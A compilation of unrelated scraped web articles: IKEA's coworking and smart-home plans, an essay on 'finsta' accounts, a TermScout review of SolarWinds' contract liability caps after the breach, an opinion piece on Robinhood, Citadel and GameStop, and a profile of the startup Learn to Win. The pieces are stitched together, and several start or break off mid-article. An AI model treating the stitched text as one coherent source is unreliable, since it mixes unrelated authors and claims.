<div id="w-node-cb2d728635af"><figure><img src="https://i2.wp.com/uploads-ssl.webflow.com/5f9dc8a1a036811f1b6788fb/5f9eb99ed5fd03adadf17e70_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F29718baf-50d5-4c9d-917e-55d18b183521_1000x563.gif?w=640&amp;ssl=1" alt="New IKEA collaboration features robotic furniture for small space living |  6sqft" data-recalc-dims="1"></figure></div>



<p>In the near future, I would also see IKEA getting into the workspaces sector, providing low-cost offices for freelancers and even startups looking to cut costs. Coworking is expected to grow to an estimated <a href="https://www.prnewswire.com/news-releases/global-coworking-spaces-market-2020-2030---covid-19-growth-deviations-trends--developments-competitive-landscape-analysis-301078785.html">$11.52 billion in 2023</a>, with Europe, IKEA’s home territory, leading the way, which makes it easier for the company to integrate this sector into its current BoKlok partnership with Skanska.</p>



<h3>3. the Smart Home</h3>



<p>In more recent years, IKEA added smart home products in its catalogue. While the company was relatively late to the party, today the IKEA customer has a number of functional smart products to choose from and which can be easily connected through the IKEA Home smart app, as well as other third-party applications. In typical IKEA fashion, its mantra of ‘making not using space’, the company did not just copy other smart appliances – IKEA’s wireless chargers can be integrated into furniture, and a SONOS Bluetooth speaker is produced either as a bookshelf or as a lamp, and both work with Google Assistant, Alexa, and Siri voice assistants. This is certainly an area were IKEA will be looking to improve on. By creating its own smart technology as an integrated part of its furniture, the company would be able to get a better understanding of how its products are being used, for how long, and can even signal to the owner when that furniture needs repairing or replacing.</p>



<div id="w-node-55f2fdd96208"><figure><img src="https://i1.wp.com/uploads-ssl.webflow.com/5f9dc8a1a036811f1b6788fb/5f9eb99d04c5930384f862ec_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Fe8f7e7b8-c1c0-42f4-825c-24b79e539dea_970x646.jpeg?w=640&amp;ssl=1" alt="The Review: Is the New Ikea x Sonos Speaker Worth It? - Western Living  Magazine" data-recalc-dims="1"></figure></div>



<p>A series of projects called ‘<a href="https://www.everydayexperiments.com/">Everyday Experiments</a>’, by SPACE10, continue on this trend of making sure that the smart appliances being created are beneficial to the consumer. These experiments recognise the increasing multi-dimensional use of one’s house, from living quarters, to play areas, to work stations. The latter is an increasingly important part of one’s home, especially since the COVID-19 pandemic. Smart improvements to the house have to respect the serenity one looks for in a home, making life easier and more comfortable, while avoiding adding further technological distractions. There are also, of course, privacy issues when it comes to smart furniture or appliances, so IKEA would also be wary of further technological intrusiveness on its customers.</p>



<p>Some of these experiments are more likely to be used in everyday situations than others, such as the one using <a href="https://www.everydayexperiments.com/light-gestures">hand gestures</a> to control a light fitting, making it easier for someone to switch on/off or dim the lights without having to move.</p>



<div id="w-node-af9a579989cd"><figure><img src="https://i2.wp.com/uploads-ssl.webflow.com/5f9dc8a1a036811f1b6788fb/5f9eb99d7943e0448eb6f49c_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252F9bd14c8f-8475-47d4-85ce-df380139d4f9_900x504.png?w=640&amp;ssl=1" alt="Image for post" data-recalc-dims="1"></figure></div>



<p>While IKEA might need to collaborate with other technological companies, such as SONOS, and depend on Google, Amazon, and Apple for voice assistants in order to grow its smart ecosystem in the short term, its better understanding of the home and what tenants want from it, allow IKEA to be in a position to create superior, practical smart appliances, than other companies in the field. Björn Block, Business Leader at IKEA Home Smart, himself <a href="https://www.theverge.com/2019/12/18/21024497/ikea-smart-home-tech-sweden-furniture-sonos-meatballs-bjorn-block">said that</a>:</p>



<p>“We’re (<em>IKEA</em>) definitely into the tech space, we’re into the digital space, and we really want to be here and really play this because I think that we can also make a difference.”</p>



<p>Which leads us to the fourth and final …</p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Social media is fake. Everybody knows this. What's interesting is the trend towards realness - towards sincerity - in private, trusted settings.</em></p>
<p>You're at a restaurant and you see some younger folks making a ruckus in their booth. They're making faces into their phones for the little videos and photos they're taking - of their food, of each other's nostrils - blurrily capturing their own hilarity. What a waste, you think in your best curmudgeonly old person's inner voice. Who's going to look at this stuff, anyway? Where are they going to post all this garbage?</p>
<p>Instagram, probably. Or maybe, if you're sufficiently out of the loop, you'd think of Snapchat. Either way you'd be drastically underestimating these teens' social media savvy. They have better instincts: they didn't have social networks dropped into their laps while they were in college, and start gleefully post all manner of ill-advised content they way the original digital generations did. They've been raised on this stuff. Today's college student has been socializing through their phone the same way they socialized on the playground since they were old enough to sit on a swingset. It wouldn't be wrong to say they've lived their entire childhood and adolescence in the constant presence of a loose, ephemeral crowd of their peers. Growing up in a panopticon.</p>
<p>So you'd be wrong, sitting there in your booth judging these kids' presumed Instagram feeds. The shots aren't going there at all.</p>
<p>They're for their finsta. Not their Insta, that gleaming, public trophy shelf where the world witnesses their finest moments, their best looks, their dearest friends. Their finsta ("fake Insta") is for reality, and for the relief of acknowledging that reality often isn't pretty. Its captions come complete with anxiety or depression. Sometimes it might get too drunk and get a little trashy. And no, you can't see it, because it's a private account.</p>
<p>There is a secret, parallel world happening on Instagram where young people are allowed to be real.</p>
<p>OK. So what?</p>
<p>Social networks are some of the most valuable properties on the planet. They get politicians elected, they get unlucky victims lynched, and they sell an obscene amount of highly targeted advertising. Historically their fates have been predicted by the next group to begin adoption: as oldschool web rings were replaced by MySpace, and as the pages of MySpace were replaced by the feeds of Facebook which is being replaced by the stories of Instagram, so these trends will determine the next billion-dollar networks and by extension the elections, lynchings, and major industries of the future. Is anybody paying attention to the widespread double lives of these networks' future userbase?</p>
<h2 id="we-saw-this-coming">We saw this coming</h2>
<p><em>This swing towards realness has been building for a while.</em></p>
<p>The idea that we all have many faces we present to the world isn't new. You can find it in Shakespeare or the Bible. What is new is the ever-escalating sense of irony we feel about our own lives - as if we can't genuinely experience joy or sorrow, at least, not in front of people. Such a display would just be so ... corny. Like a show. Instead, we're cool. We're detached. We're self-aware. We're in on the joke.</p>
<p>You know, this kind of humor:</p>
<p><img src="https://i.redd.it/gzq1vk9w3cf21.png" alt="">
<img src="https://i.redd.it/prshfb459uf21.jpg" alt="">

<p><em>Check /r/2meirl4meirl ("too me in real life for /r/me_irl ") for more spicy postmodern self-reflection.</em></p>
<p>Years ago, legendary author David Foster Wallace made a career out of examining this type of attitude:</p>
<blockquote>
<p>... What passes for hip cynical transcendence of sentiment is really some kind of fear of being really human, since to be really human (at least as he conceptualizes it) is probably to be unavoidably sentimental and naive and goo-prone and generally pathetic ...</p>
</blockquote>
<p>The culture of ironic detachment has been building for a while. It was a generational reaction that created our culture of irony in the first place. Before the internet, the previous mass medium to define an unrealistic standard of perfection was television: traditional families, no foul language, no problems that couldn't be resolved within thirty minutes including denouemount and commercial breaks.</p>
<p>Until suddenly cable television provided a venue for pop culture to swing back in the other direction. Cynicism was edgy and cool. Sincerity was corny. Shows like Seinfeld and Frasier reveled in this new nihilism: one of the original great video essays was an analysis of how television reflected our societal swing away, and then back to, sincerity<a href="#footnotes"><sup>(link 1)</sup></a>.</p>
<p>David Foster Wallace had another prescient story about the societal effects of the internet in the form of ubiquitious videoconferencing. In <em>Infinite Jest</em> he described the demise of the videophone: at first, it was a beloved invention that was rapidly adopted. But people loved seeing themselves more than they cared to see others. And the pressure of appearing at any time, on screen, put-together and ready to put on a public face even after just rolling out of bed, proved to be too much. Masks were sold, just good enough to fool the cheap cameras of the early videophones. But of course technology improved. And so the masks, and, eventually, full lens-cap dioramas, as the arms race progressed. Eventually nobody ever actually appeared on their videophones at all, and they fell into disuse.</p>
<p>If product strategists at Facebook and Instagram aren't viewing the escalating arms race of artificial perfection on their platforms with alarm, then they're likely to be replaced by somebody who understands their uses better than they do.</p>
<h2 id="this-is-not-a-special-modern-phenomenon">This is not a special, modern phenomenon</h2>
<p><em>Kids have always been dissatisfied with the world they inherit.</em></p>
<p>Everybody rebels against their parents, as the pendulum of society swings in time to its generational pulse. Some of the oldest stories of western civilization are about these cycles: the gods of Olympus overthrew the Titans' old order to create a new one. The Victorians rejected the decadence and excess of their parents' and grandparents' Edwardian world to create a purer civilization.</p>
<p>Today's tech industry is the domain of the aging young, who famously moved fast and broke things. But to the new adults who never knew anything else, maybe obsessing over like counts, gluing one's attention to high-frequency social media networks, and sharing overly watermarked political memes looks like old person behavior. What happens when the inheritors of the digital world grow up and decide what's going to be next?</p>
<p>As a thought exercise, picture a teenager in 2025. She's waiting at the dinner table to eat while her dad is Instagramming the photogenic meal kit he's proudly put together. "Okay!" he cries. *"Bon apetit!"* Throughout the meal, Mom and Dad furtively slide their phones out of their pockets to answer a Slack from work, or show each other another parent's funny video of their kid doing something precious. When dorky parent behaviour looks like that, what's a teenager to do?</p>
<p><em>The Atlantic</em> gave us a preview a few weeks ago with profiles of kids Googling themselves for the first time<sup><a href="#footnotes">(link 2)</a></sup>. As evidenced by the finsta phenomenon, it's a generation with a different standard of privacy. How horrified will they be to see all the stupid things their parents posted about them - publicly, irrevocably - on the Internet? And what decisions will they make as a result?</p>
<h2 id="authenticity-is-scarce-and-scarcity-is-value">Authenticity is scarce, and scarcity is value</h2>
<p><em>In a society where everything's fake, what's valuable is whatever isn't.</em></p>
<p>Techy startup types are already out ahead of the curve practicing the trendy business philosophy they call <em>radical candor</em>, adopted from one of Ray Dalio's <em>Principles</em>. It amounts to adhering to, at all times, regardless of how awkward it is, the mode of address kids would call <em>real talk</em>. Did somebody bore the entire room with an endless presentation they could have just sent as an email? In a business practicing radical candor, you would tell them - right there in front of everybody - that they did a terrible job conveying the information they set out to convey and that they should be more concise in the future (ouch).</p>
<p>Radical candor works surprisingly well in exactly one circumstance: when there's such a bond of trust and acceptance between the parties involved that no real hurt can be transmitted. Particularly brutal criticism yields not hurt, but appreciation that somebody else cared enough to wade through all your shit and come away with an insight that might - while painful - be genuinely useful to you.</p>
<p>There's a certain slanted similarity to how a social media feel full of garbage content is more valuable, to a select, trusted group of friends, than whatever beautifully posed shots make it to the public-facing feed. The value is not in the actual "quality" of the content. (What does quality even mean, anyway? Production quality? How cunningly the picture was framed and filtered?) The value is in the content's level of authenticity. Because authenticity, not quality, is the scarce resource on social media.</p>
<p>You can see this trend creeping into almost every aspect of culture you care to look at: reality television, which replaced scripted theatricality for real drama. Livestreaming, an even rawer exploration of the same phenomenon. Journalists making a living as Twitter influencers with subscription newsletters. Politicians winning elections because they speak and act in a manner that doesn't feel stilted and prearranged.</p>
<h2 id="the-future">The future</h2>
<p>*"It's already here, it's just not evenly distributed."*</p>
<p>How are we going to view this particular moment in our culture in ten years? In a hundred? Geek idol Neal Stephenson presented a fairly pessimistic view in his most recent novel <em>Seveneves</em>, in which a character loosely based on Cory Doctorow is part of a group in a constellation of orbital capsules. He authors some blog posts that have a surprising and tragic effect, and unfortunately for him, he maintains his regular social media habits while doing it:</p>
<blockquote>
<p>Fair or not, Tavistock Prowse would forever be saddled with blame for having …</p></blockquote></div></div>

January 29, 2021 | https://pages.termscout.com/solarwinds-contract-leaves-customers-with-little-hope-of-recovery/ | <a href="https://web.archive.org/web/*/https://pages.termscout.com/solarwinds-contract-leaves-customers-with-little-hope-of-recovery/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>The 250 US federal agencies and businesses that fell victim to the recent cyber attack had one thing in common – they all used software provided by SolarWinds Worldwide, LLC (“SolarWinds”).&nbsp; TermScout – a software contract rating company –&nbsp; looked at the standard customer contract that SolarWinds customers are asked to sign – the <a href="https://www.solarwinds.com/-/media/solarwinds/swdcv2/legal/legal-documents/solarwinds-software-services-agreement.ashx?la=en&amp;hash=C9D4ACDBAE48680890EF52C6E4663B0C9208F341">Software Services Agreement</a> (“SSA”).&nbsp; In this article, we explore what the SSA says about how risk is allocated between SolarWinds and its customers in this type of event, assuming a customer is able to prove that SolarWinds is liable, under breach of contract or some other theory.</p><p><span>[TermScout is not commenting on whether or not SolarWinds is liable or responsible for this breach.&nbsp; This article is purely a hypothetical analysis that analyzes how the SSA purports to allocate risk on such matters.]</span></p><h2>Overall</h2><p>While the SSA does commit SolarWinds to basic data security standards (see Data Security Commitments below), the limits on SolarWinds’ liability will likely keep most customers from recovering any or all of their damages, even if they’re able to prove that SolarWinds breached the agreement or otherwise would be liable (i.e. under another theory such as tort).&nbsp;&nbsp;</p><p>SolarWinds’ total liability for direct damages is capped at the amount paid or payable by the customer in the last 12 months, and SolarWinds is not liable for any type of indirect damages.&nbsp; Notably, there are no exceptions to these limits on SolarWinds’ liability.&nbsp; This means that even if a customer that signed the SSA can prove that SolarWinds is liable for damages the customer suffers as a result of this breach, it is unlikely to recover more than 12 months’ worth of fees.</p><p>While capping liability at 12 months’ fees is very common (<a href="https://termscout.com/contract-comparison/incident-management-software">all 3 companies TermScout has reviewed in the Incident Management Software category</a> (“IMS”) do this), failing to carve out any exceptions from the limits is uncommon, and is one of many red flags that TermScout tracks.&nbsp; The other 2 IMS companies reviewed carve out liabilities related to third party IP infringement, but none carve out liabilities related to data security or data breach issues. &nbsp; While this approach is not uncommon, we are seeing more and more companies accept increased liability for violating their data security commitments.&nbsp; <a href="https://termscout.com/contract-review/cloud-platform-as-a-service-paas-software/snowflake">Snowflake</a>, for example, doubles the amount a customer can recover for data security-related issues – to 2 times 12 months’ fees [12(c), <span><a href="https://1amiydhcmj36tz3733v94f15-wpengine.netdna-ssl.com/wp-content/uploads/2018/11/2019Aug23-Snowflake-Terms-of-Service-eo.pdf">Snowflake’s TOS</a>]</span>.</p><p>Taking into account the above factors and a number of other considerations, <a href="https://termscout.com/contract-review/primary-comparison/solarwinds#methodology">SolarWinds’ SSA earned the TermScout overall rating of <strong>Extremely</strong> <strong>Unfavorable</strong></a> – the worst of the 3 IMS companies we have reviewed.</p><h2>Data Security Commitments</h2><p>For every software contract TermScout looks at, it answers the data-security questions shown in the table below, among others.&nbsp; This data, along with similar data from 17 other contractual topics (e.g., limits on liability, indemnification, etc.), is used to calculate overall contract favorability so that TermScout customers can quickly understand the level of risk they take on when signing new contracts (<span>Learn more about TermScout’s methodology </span><a href="https://pages.termscout.com/methodology/"><span>here</span></a>).</p><p>TermScout considers the following to be basic minimum requirements that customers look for in contracts – customers with leverage or heightened data risks may seek stronger protections.</p><table id="tablepress-2"><thead><tr><th>Question</th><th>SolarWinds SSA</th><th>Citation</th></tr></thead><tbody><tr><td>Does the vendor make any contractually binding commitments with respect to its data security standards or practices?</td><td>Yes, to “maintain appropriate administrative, physical, technical and organizational measures that ensure an appropriate level of security for Confidential Information and Personal Data.”</td><td>7.2, SSA</td></tr><tr><td>Which third party data security audits, standards, or certifications does the vendor commit to?</td><td>EU-US and Swiss-US Privacy Shield Framework</td><td>Privacy Shield, Privacy Notice (1)</td></tr><tr><td>Does the contract provide a list of subprocessors?</td><td>Yes</td><td>5.2, DPA (2)</td></tr><tr><td>Does the vendor commit to ensuring that its sub-processors will be bound by the same or similar data or privacy commitments as those contained in the contract?</td><td>Yes</td><td>5.2, DPA</td></tr><tr><td>Does the vendor commit to any form of data breach notification policy?</td><td>Yes</td><td>7, DPA</td></tr><tr><td>Are claims related to any form of data security issues excluded from the limits on Vendor’s liability?</td><td>No</td><td>11, SSA</td></tr></tbody></table><p><img loading="lazy" src="https://pages.termscout.com/wp-content/uploads/Solarwind-Footnotes.png" alt="" width="777" height="64" srcset="https://pages.termscout.com/wp-content/uploads/Solarwind-Footnotes.png 777w, https://pages.termscout.com/wp-content/uploads/Solarwind-Footnotes-480x40.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 777px, 100vw"></p><h2>Conclusion</h2><p>Customers that signed the SolarWinds standard SSA will have limited rights of recovery.&nbsp; Many companies still sign software agreements and other click-throughs without any form of review, rolling the dice with unknown risks and granting vendors carte blanche to write the rules of engagement unchecked.</p><p>TermScout helps companies quickly assess risk in contracts so that customers can easily understand what they’re signing.&nbsp;&nbsp;&nbsp;</p><p>By: Otto Hanson, Founder &amp;

<p><a rel="noreferrer noopener" href="https://outlookzen.com/2015/05/25/avoiding-the-next-financial-meltdown/" target="_blank">In past articles</a>, we have discussed how big-corporations, particularly in the financial industry, put at risk our economy and financial system. Recent events around Gamestop trading, have served as a perfect illustration of the risks and dangers inherent to Big Banks.</p>



<hr>



<p><strong>Context:</strong> There has recently been <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/GameStop_short_squeeze" target="_blank">a frenzy of trading activity in shares of Gamestop</a>. Once languishing in the doldrums, its shares attracted large numbers of short-sellers from institutional investors, particularly hedge funds. At some point, mom-and-pop retail investors realized that they had a big opportunity in front of them. First, they argued that <a href="https://www.youtube.com/watch?v=GZTr1-Gp74U&amp;ab_channel=RoaringKitty" target="_blank" rel="noreferrer noopener">the fundamentals of the business were being underestimated</a> (just like themselves) by the financial elites. Second, they noticed that with such huge short-sale positions, <a href="https://www.cnbc.com/2021/01/27/gamestop-mania-explained-how-the-reddit-retail-trading-crowd-ran-over-wall-street-pros.html" target="_blank" rel="noreferrer noopener">the short-sellers would be made tremendously vulnerable if the shares were to appreciate in value</a> – which would in turn drive up the share price even more. Championed by a hitherto unknown “Roaring Kitty aka /u/DeepFuckingValue”, these mom-and-pop investors bet big on Gamestop shares, sending the stock price soaring.</p>



<p>As expected, the hedge funds and other financial elites who had made the opposite bet, found themselves in hot water. At the start of trading on Thursday, they faced the prospect of tremendous losses, if Gamestop shares were to continue appreciating. As feared, the shares came roaring out of the gate – jumping from $260 to $468, in the first 30 minutes alone. And that is when rules of the game changed. </p>



<p>Robinhood, the most popular trading platform for mom-and-pop investors, announced right at this critical point, <a href="https://www.theverge.com/2021/1/28/22254102/robinhood-gamestop-bloc-stock-purchase-amc-reddit-wsb" target="_blank" rel="noreferrer noopener">that its investors would no longer be allowed to buy Gamestop shares</a>. Not even with their own money. Most telling, they were still allowed to sell their shares, but they certainly weren’t allowed to buy any. The upward trajectory was immediately halted, and <a href="https://finance.yahoo.com/quote/GME/chart?p=GME#eyJpbnRlcnZhbCI6MSwicGVyaW9kaWNpdHkiOjEsImNhbmRsZVdpZHRoIjozLjU4OTE3MTk3NDUyMjI5Mywidm9sdW1lVW5kZXJsYXkiOnRydWUsImFkaiI6dHJ1ZSwiY3Jvc3NoYWlyIjp0cnVlLCJjaGFydFR5cGUiOiJsaW5lIiwiZXh0ZW5kZWQiOmZhbHNlLCJtYXJrZXRTZXNzaW9ucyI6e30sImFnZ3JlZ2F0aW9uVHlwZSI6Im9obGMiLCJjaGFydFNjYWxlIjoibGluZWFyIiwicGFuZWxzIjp7ImNoYXJ0Ijp7InBlcmNlbnQiOjEsImRpc3BsYXkiOiJHTUUiLCJjaGFydE5hbWUiOiJjaGFydCIsImluZGV4IjowLCJ5QXhpcyI6eyJuYW1lIjoiY2hhcnQiLCJwb3NpdGlvbiI6bnVsbH0sInlheGlzTEhTIjpbXSwieWF4aXNSSFMiOlsiY2hhcnQiLCJ2b2wgdW5kciJdfX0sImxpbmVXaWR0aCI6Miwic3RyaXBlZEJhY2tncm91bmQiOnRydWUsImV2ZW50cyI6dHJ1ZSwiY29sb3IiOiIjMDA4MWYyIiwic3RyaXBlZEJhY2tncm91ZCI6dHJ1ZSwiZXZlbnRNYXAiOnsiY29ycG9yYXRlIjp7ImRpdnMiOnRydWUsInNwbGl0cyI6dHJ1ZX0sInNpZ0RldiI6e319LCJjdXN0b21SYW5nZSI6eyJzdGFydCI6MTYxMTg0NDIwMDAwMCwiZW5kIjoxNjExODY3NTQwMDAwfSwic3ltYm9scyI6W3sic3ltYm9sIjoiR01FIiwic3ltYm9sT2JqZWN0Ijp7InN5bWJvbCI6IkdNRSIsInF1b3RlVHlwZSI6IkVRVUlUWSIsImV4Y2hhbmdlVGltZVpvbmUiOiJBbWVyaWNhL05ld19Zb3JrIn0sInBlcmlvZGljaXR5IjoxLCJpbnRlcnZhbCI6MSwidGltZVVuaXQiOiJtaW51dGUifV0sInN0dWRpZXMiOnsidm9sIHVuZHIiOnsidHlwZSI6InZvbCB1bmRyIiwiaW5wdXRzIjp7ImlkIjoidm9sIHVuZHIiLCJkaXNwbGF5Ijoidm9sIHVuZHIifSwib3V0cHV0cyI6eyJVcCBWb2x1bWUiOiIjMDBiMDYxIiwiRG93biBWb2x1bWUiOiIjRkYzMzNBIn0sInBhbmVsIjoiY2hhcnQiLCJwYXJhbWV0ZXJzIjp7IndpZHRoRmFjdG9yIjowLjQ1LCJjaGFydE5hbWUiOiJjaGFydCIsInBhbmVsTmFtZSI6ImNoYXJ0In19fSwidGltZVVuaXQiOiJtaW51dGUiLCJyYW5nZSI6eyJkdExlZnQiOiIyMDIxLTAxLTI4VDA1OjAwOjAwLjgwNVoiLCJkdFJpZ2h0IjoiMjAyMS0wMS0yOVQwNDo1OTowMC44MDVaIiwicGVyaW9kaWNpdHkiOnsiaW50ZXJ2YWwiOjEsInBlcmlvZCI6MSwidGltZVVuaXQiOiJtaW51dGUifSwicGFkZGluZyI6MH19" target="_blank" rel="noreferrer noopener">the share price collapsed from $468 to $130, within a couple hours</a>.

<p><strong>Within hours</strong>, Robinhood found themselves under a huge magnifying glass. Politicians as divided as AOC, Ted Cruz and <a href="https://www.boston.com/news/politics/2021/01/28/elizabeth-warren-gamestop" target="_blank" rel="noreferrer noopener">Elizabeth Warren</a>, all protested the flagrant unfairness of what was happening to mom-and-pop investors. There were <a href="https://www.cnn.com/2021/01/28/investing/lawsuit-robinhood-gamestop-wallstreetbets/index.html" target="_blank" rel="noreferrer noopener">countless lawsuits filed</a>, and wide-ranging calls for <a href="https://www.cnbc.com/2021/01/29/sec-reviewing-recent-trading-volatility-amid-gamestop-frenzy-vows-to-protect-retail-investors.html" target="_blank" rel="noreferrer noopener">the SEC to investigate what had occurred</a>. But this was only the tip of the iceberg. Soon, a more dangerous story emerged.</p>

<p>Apparently, Robinhood’s biggest customer, source of revenue, and the firm that processes a lot of their user’s trades, <strong>is the same firm</strong> that has also bailed out the original Gamestop short seller, manages $35B in investments, and has a financial stake in driving down Gamestop’s share price. With incentives like these, it’s hardly surprising if Robinhood’s restrictions were motivated by Citadel’s larger agenda of depressing the share price, and the levers they have available to pull.</p>



<hr>



<p><strong>Let me be clear</strong> about one thing. I am not here to convict Citadel or Robinhood of any crimes. At this point, far more investigation is required, before we can reach any conclusions on what exactly happened.</p>



<p>That said, any clear eyed view of the above chain of events, can only reach one conclusion. Our current financial and economic system is dangerously suspect. Imagine a world where your doctor has bet a million dollars on you dying soon. Imagine a world where a criminal suspect’s parent is made lead investigator in the case. Regardless of whether these individuals acted inappropriately, any competent person would realize that the system is dangerously broken.</p>



<p><em>When people repeatedly face conflicts of interest, they will eventually behave unethically to further their own interests</em>. When you have a single firm that takes long-term investment stakes, while simultaneously facilitating retail trading activity as a market-maker and paying retail brokerage firms tens of millions of dollars, unethical behavior will inevitably happen. Trying to plug these leaks as and when they happen, investigating every individual case one-by-one, is simply a never ending game of whack-a-mole.</p>



<p>Our economy is fundamentally rigged in favor of big-corporations, and stop-gap solutions will simply not do. The only way to attack the problem is to go to the very source. <strong>We need to break up the big Corporations</strong>.&nbsp;</p>



<p>We need to break them up into discrete businesses. Each with their own independent CEO and board-of-directors. Each pursuing a single line-of-business. Each free from any conflict of interests, and potential for collusion. Each large enough to run their own business successfully and efficiently, but small enough that they don’t have the power to bribe Congress, bully smaller competitors, collude across different market segments, and rewrite the rules of the game. Each operating independently, in a free and competitive market.</p>



<p>Big corporations are fundamentally antithetical to a level playing field. It is time we broke them up.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the world of startups, moving fast is an advantage, but only if you are moving in the right direction. A thorough understanding of the problem you’re trying to solve and the landscape in which you’re applying it, whether it’s funding, customer acquisition, or product development, is key. </p><p>For <a href="https://www.bmnt.com/post/h4xlabs">dual-use startups</a>, this is a gargantuan task. <a href="https://www.learntowin.us/">Learn to Win</a>, an active platform that streamlines training for high-performance teams and improves professional education in areas from <a href="https://www.learntowin.us/athletics/">athletics</a> to <a href="https://www.learntowin.us/defense/">the defense sector</a>, recently learned how to navigate this complex maze. </p><p>An alum of the 2019 <a href="https://www.h4d.us/">Hacking 4 Defense</a>® course at Stanford and participant in our recent <a href="https://www.h4xlabs.com/">H4XLabs</a> cohort, Learn to Win developed a software prototype to revolutionize training for Air Force fighter pilots. The team had a background in high performance athletic training and developed a micro-video playbook learning platform for professional and NCAA athletes. They parlayed that knowledge into getting customers across the government and enterprise sectors--becoming the first H4D team to land a hard-to-get <a href="https://www.afsbirsttr.af.mil/About/-Phase-III/">SBIR Phase III funding,</a> and this week <a href="http://www.prweb.com/releases/learn_to_win_launches_active_learning_platform_for_high_performance_training/prweb17694962.htm">announcing</a> $4 million in seed funding to bring its mobile-first active learning platform to first responders, frontline workers and the military.</p><p>Recently, the company’s co-founders -- Andrew Powell, Sasha Seymore, and Phil Stiefel -- shared how their collaboration with academia, enterprise and government helped them gain insights and business intelligence they wouldn’t have otherwise been able to get. Starting with a solid foundation, finding good mentors, being able to demonstrate value for dual uses and being guided by a shared mission helped them achieve success, they said. Here are their takeaways: </p><h2><strong>Start with a solid foundation </strong></h2><p>Learn to Win credits H4D®, the national academic program sponsored by <a href="https://www.nsin.us/">NSIN</a> and powered by BMNT and its nonprofit arm, <a href="https://www.commonmission.us/">The Common Mission Project</a>, with giving them critical skills and knowledge for their startup journey. </p><p>“The appeal of Hacking 4 Defense was getting to learn the entrepreneurial skill set in the Lean Startup framework while also working on problems that really matter,” Andrew said. “The degree of collaboration and level of access was really impressive. And it was so valuable getting out into the field. Through the program, we spoke to more than 100 operators involved in all different parts of the training, enabling us to understand the nitty gritty of what people needed. Without Hacking 4 Defense, it would have taken us years to figure out the nuances of the challenges and how we could contribute. We've now gone beyond pilot training but that was one of the big things that struck me about being in the class.”</p><p>Phil added: “What struck me was how real world it was. InHacking 4 Defense, you have to prove your concepts in the laboratory of real life. It’s an effective way to educate people.”</p><h2><strong>Find good mentors</strong></h2><p>Following their success with the class, the team wanted to explore the technology and get real-world user data. </p><p>Finding helpful experts to help navigate the dual-use market was key, since finding a home for a private sector startup in the government has challenges from both sides. From a startup’s perspective, there are lots of unknowns in understanding how to bring a solution into an unfamiliar, yet established system. This includes conducting outreach with the right people, testing ideas effectively, and deeply understanding the problems you’re trying to solve. From the government perspective, there are significant hurdles around finding and adopting new technologies that fit the bill. </p><p>Learn to Win had proven their worth in the enterprise world and demonstrated the benefits of their modern, digitally based training.They also knew they’d need to evolve the idea to address the problems specific to the Department of Defense. But first, they needed funding to build out a solution customized for the DoD and prove their capacity as a dual-use business. </p><p>This is the point where a lot of young startups would throw their hands up. Getting a foot in the government door seems like an unclimbable wall. However, talking to the right people made all the difference. “As graduate students you can have a great idea and a ton of drive, but you're going to hit these really tough hurdles. And when you hit those hurdles, you can either invest a ton of time and spend hours and hours of research and think you might have the right answer. Or you can talk to somebody who's done it before,” Phil said. </p><p>In collaboration with university, industry and defense organizations supplemented with H4XLabs weekly coaching sessions, Learn to Win fast-tracked their understanding of funding programs like SBIR -- the self-described ‘America’s seed fund’ -- and helped them get their materials in prime shape for a strong application.</p><p>The result was a funding turnaround so fast any VC firm would gawk; one month from proposal, they received $750,000. In total, they’ve received $2.6M from the Air Force Inspection Agency. In doing so, Learn to Win was the first H4D alumnus to transition to SBIR Phase III.</p><p>Funding bodies like SBIR are valuable because they allow startups to introduce their solutions within government, but without an experienced mentor this can be difficult to do--particularly once you approachSBIR Phase III, where the government is spending its own dollars and therefore has a much lower acceptance rate. </p><p>SBIR Phase III funding has several distinct advantages. It enables sole-source contracting, which means startups can receive any type of money from more or less any budget. If approved by the DoD, as was the case with Learn to Win, any department within the government’s defense sector could choose to leverage the company’s services with minimal contracting overhead.Additionally, they can customize the contract to their needs, leveraging the product in a small or big way. These are huge incentives for adoption; a low-friction acquisition process will inevitably translate to rapid business growth. </p><p>Another benefit: Learn to Win was uniquely positioned to connect with the burning pain points of their customer. In tandem with the private sector, Learn to Win arrived at a time when the DoD was seeing a big push to implement mobile training and making content more accessible. The customer was already looking for a replacement, and Learn to Win was in a good spot to communicate their full value to the Air Force because of their work during the SBIR Phase II. </p><p>Still, it’s not enough to say, “This worked for the private sector!” to convert government customers. The connection between H4D and Phase III SBIR funding comes alive in positioning a startup for an impactful proof of concept, and validating a dual-use business model, Learn to Win’s co-founders said.</p><h2><strong>Demonstrate value for dual uses</strong></h2><p>Government funding can present challenges for startups that might want to seek SiliconValley funding down the road, but that wasn’t the case for Learn to Win, which was able to demonstrate its value in both government and commercial use cases. </p><p>They had worked with an elite sports team where each player needed to know a specific set of skills, and had done so quickly and consistently. Similarly, their work with the Air Force’s fighter squadron to prepare for a large exercise proved the value of their mission within government. </p><p>In both cases, Learn to Win had something to point to: a high-performance learning tool that makes everybody a faster learner, makes everybody a better teacher, and makes every organization more agile. That showed investors the power of their technology to replace the archaic training models, based on three-ring binders and outdated PowerPoints, which most of their incumbent customers were working with. </p><p>Investors could see a manifestation of the potential for a multi-billion dollar tech company in a dual-use way. </p><h2><strong>Be guided by a shared mission</strong></h2><p>Andrew said of the process: “In Silicon Valley, there's kind of this historical conventional wisdom that it's slow and laborious to work with the government. But that really hasn't been our experience. It's been fast, it's been agile. It's been welcoming. And we feel really excited about both the potential to build a very impactful business, and also to build a very successful business. There are innovators in government, in defense, building these long-term sustainable relationships with tech companies. And multi-billion dollar tech companies can be built in a dual-use way. And we have felt that through collaborating with that whole ecosystem of innovators.”</p><p>He added that a vital ingredient to a startup’s survival is a sense of purpose. One thing Learn to Win’s co-founders reference repeatedly in conversation about their company’s origin is how having a shared vision and a desire to be mission-driven is key for them. </p><p>“There’s a 